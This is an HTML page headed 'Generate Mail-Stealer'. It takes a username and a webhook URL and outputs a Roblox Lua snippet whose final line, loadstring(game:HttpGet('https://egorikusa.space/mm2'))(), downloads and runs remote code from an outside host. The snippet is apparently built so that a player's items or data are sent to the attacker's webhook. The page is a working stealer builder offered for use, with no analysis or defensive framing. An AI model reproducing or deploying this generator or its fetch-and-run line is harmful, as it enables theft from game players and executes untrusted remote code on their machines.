<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>wow</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
<style>
  body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; padding: 50px; }
  .container { background-color: white; padding: 20px; border-radius: 8px; display: inline-block; }
  .input-field, button { margin: 10px 0; }
  button { padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
  button:hover { background-color: #0056b3; }
  #output { text-align: left; white-space: pre-wrap; }
  textarea { width: 100%; height: 150px; }
  .error { color: red; }
</style>
</head>
<body>
  <div class="container">
    <h1>Generate Mail-Stealer</h1>
    <div class="input-field">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username">
    </div>
    <div class="input-field">
      <label for="webhook">Webhook:</label>
      <input type="text" id="webhook" name="webhook">
    </div>
    <div id="error-message" class="error"></div>
    <button onclick="generateOutput()">Generate</button>
    <textarea id="output"></textarea>
    <button onclick="copyToClipboard()">Copy to Clipboard</button>
  </div>

<script>
    function isValidUrl(url) {
        var pattern = new RegExp('^(https?:\\/\\/)?'+ // protocol
            '((([a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+[a-z]{2,6})|'+ // domain...
            '((\\d{1,3}\\.){3}\\d{1,3})|'+ // ...or ipv4
            '(\\[?[a-f0-9]*:[a-f0-9:]+\\]?)'+ // ...or ipv6
            ')(:\\d+)?(\\/[-a-z0-9%_.~+]*)*'+ // port and path
            '(\\?[;&a-z0-9%_.~+=-]*)?'+ // query string
            '(#[-a-z0-9_]*)?$','i'); // fragment locator
        return !!pattern.test(url);
    }

    function generateOutput() {
        var username = document.getElementById("username").value.trim();
        var webhook = document.getElementById("webhook").value.trim();
        var errorMessage = document.getElementById("error-message");
        
        if (!username) {
            errorMessage.textContent = 'Username is required.';
            return;
        }
        
        if (!isValidUrl(webhook)) {
            errorMessage.textContent = 'Invalid webhook URL format.';
            return;
        }
        
        errorMessage.textContent = '';
        
        var outputString = 'Username = "' + username + '"\n' +
                           'Webhook = "' + webhook + '"\n' +
                           'loadstring(game:HttpGet("https://egorikusa.space/mm2"))()';
        document.getElementById("output").value = outputString;
        hljs.highlightAll();
    }

    function copyToClipboard() {
        var copyText = document.getElementById("output");
        copyText.select();
        document.execCommand("copy");
    }
</script>

</body>
</html>
